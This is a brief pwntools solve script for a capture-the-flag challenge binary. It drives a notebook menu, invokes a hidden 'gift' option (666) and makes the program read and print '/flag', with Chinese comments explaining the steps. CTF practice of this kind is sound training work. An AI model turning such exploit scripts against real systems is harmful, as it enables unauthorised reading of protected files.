from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level2.1"
p = process(challenge_path)

# create string
contentt=p64(0x11111111)*4
sss="/flag"
p.sendlineafter("Choice >> \n","1")
p.sendlineafter("Input your notebook index:\n","0")
p.sendlineafter("Input your notebook size:\n","5")
p.sendlineafter("Input your notebook content:\n",sss)
p.sendlineafter("Choice >> \n","666")
p.sendlineafter("Input your notebook index:\n","0")
p.sendlineafter("Choice >> \n","4")
p.sendlineafter("Input your notebook index:\n","0")

# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
读源码
目标是让book的content放flag地址
先create再gift再show
gift函数将某本书的show指向read_flag
show函数将content作为filename调用read_flag
目标是在content中写入/flag
直接交互就行 
'''